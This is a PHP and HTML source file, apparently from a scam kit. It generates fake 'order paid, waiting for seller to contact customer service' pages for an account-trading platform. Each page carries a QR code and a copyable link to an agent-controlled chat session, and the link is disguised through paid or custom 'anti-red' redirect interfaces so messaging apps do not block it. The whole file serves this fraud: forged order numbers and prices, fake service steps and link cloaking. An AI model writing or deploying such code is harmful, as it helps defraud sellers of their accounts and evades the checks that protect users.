<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin();

$currentAgent = $_SESSION['username'];

function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '白情') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}

$customerName = generateCustomerName();
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '白情');

$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;
$originalServiceUrl = $baseUrl . '/' . "ChatBaiqing" . '?id=' . $sessionId;

// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>

	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/baiqing.css">
    <style>
        .XEbq-main-content {
    height: 100vh;
}
    </style>
</head>

</head>
<body>
	<div id="app" data-v-app="">
		<div class="app-container">
			<div class="scroll-container">
				<div class="form-container">
					<div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
					<div class="form-row">
						<label>标题</label>
						<input type="text" id="title-input">
					</div>
					<div class="form-row">
						<label>金额</label>
						<input type="number" id="price-input" placeholder="">
					</div>
					<div class="form-row">
						<label>订单编号</label>
						<div style="display: flex; align-items: center; width: 100%;">
							<input type="text" id="order-number-input" readonly style="flex: 1;">
							<button class="order-number-btn" id="generate-order-btn">重新生成</button>
						</div>
					</div>
					<div class="form-row">
						<label>封面图</label>
						<label for="upload-cover" class="form-link" id="upload-label">上传图片</label>
						<input type="file" accept="image/*" id="upload-cover" style="display: none;">
					</div>
				</div>
				<!-- 预览区域开始 -->
				<div class="XE-main">
					<div class="XEbq-page-background">
						<div class="XEbq-content-background">
							<div class="XEbq-main-content">
								<div class="XEbq-card">
									<div class="XEbq-card-title">已下单，等待卖家联系客服</div>
									<div class="XEbq-progress-container">
										<div class="XEbq-progress-bar"></div>
										<div class="XEbq-progress-bar inactive"></div>
										<div class="XEbq-progress-step active">
											<div class="XEbq-step-indicator">
												<div class="XEbq-step-dot"></div>
											</div>
											<div>已付款</div>
										</div>
										<div class="XEbq-progress-step">
											<div class="XEbq-step-indicator">
												<div class="XEbq-step-dot inactive"></div>
											</div>
											<div>联系客服</div>
										</div>
										<div class="XEbq-progress-step">
											<div class="XEbq-step-indicator">
												<div class="XEbq-step-dot inactive"></div>
											</div>
											<div>客服验号</div>
										</div>
										<div class="XEbq-progress-step">
											<div class="XEbq-step-indicator">
												<div class="XEbq-step-dot inactive"></div>
											</div>
											<div>换绑账号</div>
										</div>
										<div class="XEbq-progress-step last">
											<div class="XEbq-step-indicator">
												<div class="XEbq-step-dot inactive"></div>
											</div>
											<div>完成交易</div>
										</div>
									</div>
								</div>
								<div class="XEbq-card">
									<div class="XEbq-card-title">联系客服</div>
									<div class="XEbq-notice-container">
										<div>
											<div class="XEbq-notice-text">请提醒卖家<span class="XEbq-text-highlight">扫码发货</span>。为保障您的交易安全，请勿将此二维码泄露给他人</div>
										</div>
										<div class="XEbq-notice-row">
											<div class="XEbq-notice-tip">注意：为保障高峰时段系统稳定运行及用户体验，平台将在订单量激增期间动态调整订单显示规则，<span class="XEbq-text-highlight">可能不会显示订单</span></div>
											<div class="XEbq-qr-code-container">
												<div id="qrcode"></div>
											</div>
										</div>
									</div>
								</div>
								<div class="XEbq-section-title">订单详情</div>
								<div class="XEbq-card">
									<div class="XEbq-order-item">
										<img class="XEbq-product-image" src="" alt="">
										<div class="XEbq-product-info"></div>
										<div class="XEbq-product-price" style="display: none;"> ￥<span class="XEbq-price-large"></span></div>
									</div>
									<div class="XEbq-order-details">
										<div class="XEbq-detail-row">
											<div>商品总价</div>
											<div>￥<span id="product-total-price" class="XEbq-price-large normal">0</span></div>
										</div>
										<div class="XEbq-detail-row">
											<div>实付款</div>
											<div>￥<span id="actual-payment" class="XEbq-price-large normal">0</span></div>
										</div>
										<div class="XEbq-detail-row">
											<div>订单状态</div>
											<div>进行中</div>
										</div>
										<div class="XEbq-detail-row">
											<div>订单编号</div>
											<div id="order-number-display">43289129932891343</div>
										</div>
										<div class="XEbq-view-more">查看更多</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- 预览区域结束 -->
			</div>
		</div>
	</div>
	<script src="/assets/qrcode.min.js"></script>
	<script src="/assets/qrcode-helper.js"></script>
	<script>
		// 生成二维码 - 使用PHP动态生成的链接
		var qrCodeUrl = "<?php echo $serviceUrl; ?>";
		
		// 生成18位随机订单号
		function generateOrderNumber() {
		    var chars = '0123456789';
		    var result = '';
		    for (var i = 0; i < 18; i++) {
		        result += chars[Math.floor(Math.random() * chars.length)];
		    }
		    return result;
		}
		
		document.addEventListener('DOMContentLoaded', function() {
		    // 生成客服二维码
		    var qrcodeContainer = document.getElementById("qrcode");
		    try {
		        new QRCode(qrcodeContainer, {
		            text: qrCodeUrl,
		            width: getQRSize(qrCodeUrl, 110),
		            height: getQRSize(qrCodeUrl, 110),
		            colorDark: "#000000",
		            colorLight: "#ffffff",
		            correctLevel: getQRCorrectLevel(qrCodeUrl)
		        });
		    } catch(e) {
		        console.error('QR码生成失败，尝试降级:', e);
		        try {
		            qrcodeContainer.innerHTML = '';
		            new QRCode(qrcodeContainer, {
		                text: qrCodeUrl,
		                width: 140,
		                height: 140,
		                colorDark: "#000000",
		                colorLight: "#ffffff",
		                correctLevel: QRCode.CorrectLevel.L
		            });
		        } catch(e2) {
		            qrcodeContainer.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:110px;height:110px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
		        }
		    }
		    
		    // 在二维码中间添加logo图标
		    var logoImg = document.createElement('img');
		    logoImg.src = '/assets/img/youxige.ico';
		    logoImg.style.position = 'absolute';
		    logoImg.style.top = '50%';
		    logoImg.style.left = '50%';
		    logoImg.style.transform = 'translate(-50%, -50%)';
		    logoImg.style.width = '24px';
		    logoImg.style.height = '24px';
		    logoImg.style.borderRadius = '24px';
		    logoImg.style.background = 'white';
		    logoImg.style.padding = '2px';
		    logoImg.style.boxShadow = '0 0 4px rgba(0,0,0,0.2)';
		    qrcodeContainer.style.position = 'relative';
		    qrcodeContainer.appendChild(logoImg);
		    
		    // 实时更新预览区域
		    var titleInput = document.getElementById('title-input');
		    var priceInput = document.getElementById('price-input');
		    var orderNumberInput = document.getElementById('order-number-input');
		    var generateOrderBtn = document.getElementById('generate-order-btn');
		    var uploadCover = document.getElementById('upload-cover');
		    var uploadLabel = document.getElementById('upload-label');
		    
		    var previewImage = document.querySelector('.XEbq-product-image');
		    var previewTitle = document.querySelector('.XEbq-product-info');
		    var productTotalPrice = document.getElementById('product-total-price');
		    var actualPayment = document.getElementById('actual-payment');
		    var orderNumberDisplay = document.getElementById('order-number-display');
		    
		    // 初始化订单号
		    var initialOrderNumber = generateOrderNumber();
		    orderNumberInput.value = initialOrderNumber;
		    orderNumberDisplay.textContent = initialOrderNumber;
		    
		    // 标题输入监听
		    titleInput.addEventListener('input', function() {
		        previewTitle.textContent = this.value || '商品标题';
		    });
		    
		    // 金额输入监听 - 关联商品总价和实付款
		    priceInput.addEventListener('input', function() {
		        var price = this.value;
		        productTotalPrice.textContent = price;
		        actualPayment.textContent = price;
		    });
		    
		    // 生成订单号按钮监听
		    generateOrderBtn.addEventListener('click', function() {
		        var newOrderNumber = generateOrderNumber();
		        orderNumberInput.value = newOrderNumber;
		        orderNumberDisplay.textContent = newOrderNumber;
		    });
		    
		    // 图片上传监听
		    uploadCover.addEventListener('change', function(e) {
		        var file = e.target.files[0];
		        if (file) {
		            var reader = new FileReader();
		            reader.onload = function(e) {
		                previewImage.src = e.target.result;
		                uploadLabel.textContent = '已上传';
		            };
		            reader.readAsDataURL(file);
		        }
		    });
		});
	</script>
	<script>
    function copyToClipboard(text) {
        return new Promise(function(resolve, reject) {
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(function() {
                    resolve(true);
                }).catch(function(err) {
                    console.error('复制失败:', err);
                    fallbackCopy(text, resolve, reject);
                });
            } else {
                fallbackCopy(text, resolve, reject);
            }
        }).then(function(success) {
            if (success) {
                showToast('链接已复制到剪贴板！', 'success');
            } else {
                showToast('复制失败，请手动复制', 'error');
            }
        });
    }

    function fallbackCopy(text, resolve, reject) {
        var textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        textArea.style.top = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
            var successful = document.execCommand('copy');
            document.body.removeChild(textArea);
            resolve(successful);
        } catch (err) {
            console.error('复制失败:', err);
            document.body.removeChild(textArea);
            resolve(false);
        }
    }

    function showToast(message, type) {
        var container = document.getElementById('notification-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'notification-container';
            container.className = 'notification-container';
            document.body.appendChild(container);
        }

        var toast = document.createElement('div');
        toast.className = 'new-user-toast notification-enter-active';
        if (type) {
            toast.classList.add(type);
        }

        var icon = document.createElement('div');
        icon.className = 'toast-icon';
        icon.textContent = type === 'error' ? '!' : '✓';
        toast.appendChild(icon);

        var text = document.createElement('div');
        text.className = 'toast-text';
        text.textContent = message;
        toast.appendChild(text);

        var closeBtn = document.createElement('button');
        closeBtn.className = 'toast-close';
        closeBtn.innerHTML = '&times;';
        closeBtn.addEventListener('click', function() {
            removeToast(toast);
        });
        toast.appendChild(closeBtn);

        container.appendChild(toast);

        setTimeout(function() {
            toast.classList.add('notification-leave-active');
            setTimeout(function() {
                removeToast(toast);
            }, 300);
        }, 4000);

        function removeToast(toast) {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        var copyLinkBtn = document.getElementById('copy-link-btn');
        if (copyLinkBtn) {
            copyLinkBtn.addEventListener('click', function() {
                copyToClipboard(qrCodeUrl);
            });
        }
    });
	</script>
</body>
</html>